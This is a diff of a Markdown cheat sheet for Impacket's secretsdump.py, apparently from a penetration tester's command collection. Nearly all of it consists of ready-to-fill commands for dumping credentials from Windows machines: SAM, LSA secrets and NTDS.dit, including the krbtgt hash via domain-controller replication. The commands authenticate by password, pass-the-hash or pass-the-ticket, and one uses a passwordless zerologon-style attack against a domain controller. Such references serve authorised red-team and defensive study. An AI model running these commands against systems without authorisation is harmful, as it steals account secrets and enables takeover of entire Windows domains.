@@ -1,78 +1,98 @@
-# secretsdump (imp)
+# secretsdump.py (imp)
 
 % impacket-secrets, windows, smb, 445
 
-## auth - account
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
+
+## desc
 ```
-secretsdump.py '<domain_FQDN>/<user>:<password>'@<target_name>
+Performs various techniques to dump secrets from the remote machine without executing any agent there. 
+
+For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\Temp directory) and read the rest of the data from there. 
+
+For DIT files, we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit via vssadmin executed with the smbexec/wmiexec approach. The script initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). After the work is done, things are restored to the original state.
 ```
 
-## auth - hash
-#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
-```
-secretsdump.py -hashes <lm_hash>:<nt_hash> '<domain_FQDN>/<user>@<target_name>'
+
+## auth (creds)
+```bash
+secretsdump.py -debug <domain_fqdn>/<user>:'<password>'@<target_fqdn>
 ```
 
-## auth - kerberos
-#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
-```
-KRB5CCNAME=<ccache> secretsdump.py -k -no-pass -dc-ip <dc_ip> -no-pass -k <target_name>
-```
-
-## SAM - online
-#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
-
-## SAM - offline
-#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
-```
-secretsdump.py  -system <SYSTEM_FILE|system.save> -sam <SAM_FILE|sam.save> LOCAL
+## auth (pth)
+```bash
+secretsdump.py -debug -hashes :<nt_hash> <domain_fqdn>/<user>@<target_fqdn>
 ```
 
-## LSA - online
-#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
-
-## LSA - offline
-#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
-```
-secretsdump.py -system <SYSTEM_FILE|system.save> -security <SECURITY_FILE|security.save>' LOCAL
+## auth (ptt)
+```bash
+KRB5CCNAME=<ccache> secretsdump.py -debug -k -no-pass -dc-ip <dc_fqdn> -no-pass -k <domain_fqdn>/<user>@<target_fqdn>
 ```
 
-## NTDS - online (NTLM + keys)
-#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
-```
-secretsdump.py -just-dc -user-status -outputfile <ntlm-extract-file> '<domain_fqdn>/<user>:<password>'@<dc_fqdn>
-```
-
-## NTDS - online (only NTLM)
-#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
-```
-secretsdump.py -just-dc-ntlm -user-status -outputfile <ntlm-extract-file> '<domain_fqdn>/<user>:<password>'@<dc_fqdn>
+## SAM & LSA  (creds)
+```bash
+secretsdump.py -debug -exec-method smbexec -outputfile <target_fqdn> <domain_fqdn>/<user>:'<password>'@<target_fqdn>
 ```
 
-## NTDS - online account (only NTLM)
-#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
-```
-secretsdump.py -just-dc-user <domain_fqdn>/<name|krbtgt> '<domain_fqdn>/<user>:<password>'@<dc_fqdn>
+## SAM & LSA  (pth)
+```bash
+secretsdump.py -debug -exec-method smbexec -outputfile <target_fqdn> -hashes :<nt_hash> <domain_fqdn>/<user>@<target_fqdn> 
 ```
 
+## SAM & LSA  (ptt)
+```bash
+KRB5CCNAME=<ccache> secretsdump.py -debug -exec-method smbexec -outputfile <target_fqdn> -dc-ip <dc_fqdn> -no-pass -k <domain_fqdn>/<user>@<target_fqdn>
+```
+
+## SAM (offline)
+```bash
+secretsdump.py -debug -outputfile <target_fqdn> -system <SYSTEM_FILE|system.save> -sam <SAM_FILE|sam.save> LOCAL
+```
+
+## LSA (offline)
+```bash
+secretsdump.py -debug -outputfile <target_fqdn> -system <SYSTEM_FILE|system.save> -security <SECURITY_FILE|security.save>' LOCAL
+```
+
+## NTDS - all (creds)
+```bash
+secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status  <domain_fqdn>/<user>:'<password>'@<dc_fqdn>
+```
+
+## NTDS - all (pth)
+```bash
+secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -hashes :<nt_hash> <domain_fqdn>/<user>@<dc_fqdn>
+```
+
+## NTDS - all (ptt)
+```bash
+KRB5CCNAME=<ccache> secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -no-pass -k <domain_fqdn>/<user>@<dc_fqdn>
+```
+
+
+## NTDS - user (creds)
+```bash
+secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -just-dc-user <domain_fqdn>/<name|krbtgt> <domain_fqdn>/<user>:'<password>'@<dc_fqdn>
+```
+
+## NTDS - user (pth)
+```bash
+secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -just-dc-user <domain_fqdn>/<name|krbtgt> -hashes :<nt_hash> <domain_fqdn>/<user>@<dc_fqdn>
+```
+
+## NTDS - user (ptt)
+```bash
+KRB5CCNAME=<ccache> secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -just-dc-user <domain_fqdn>/<name|krbtgt> -no-pass -k <domain_fqdn>/<user>@<dc_fqdn>
+```
 
 ## NTDS - offline
-#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
-```
-secretsdump.py  -ntds <NTDS_FILE|ntds_file.dit> -system <SYSTEM_FILE|system.save> LOCAL -outputfile <ntlm-extract-file>
+```bash
+secretsdump.py -debug -outputfile <dc_fqdn> -ntds <NTDS_FILE|ntds_file.dit> -system <SYSTEM_FILE|system.save> LOCAL 
 ```
 
 
-## anonymous get administrator 
+## NTDS - zerologon 
 zerologon
-#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
-```
-secretsdump.py <domain_fqdn>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administrator"
-```
-
-## DCSYNC - online (ptt)
-#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
-```
-secretsdump.py -k -no-pass -just-dc -outputfile <file-prefix>  -dc-ip <dc_ip> '<domain_fqdn>/<user>'@<dc_fqdn>
+```bash
+secretsdump.py -debug -outputfile <dc_fqdn> -just-dc -user-status -no-pass <dc_name>\$/@<dc_fqdn>
 ```
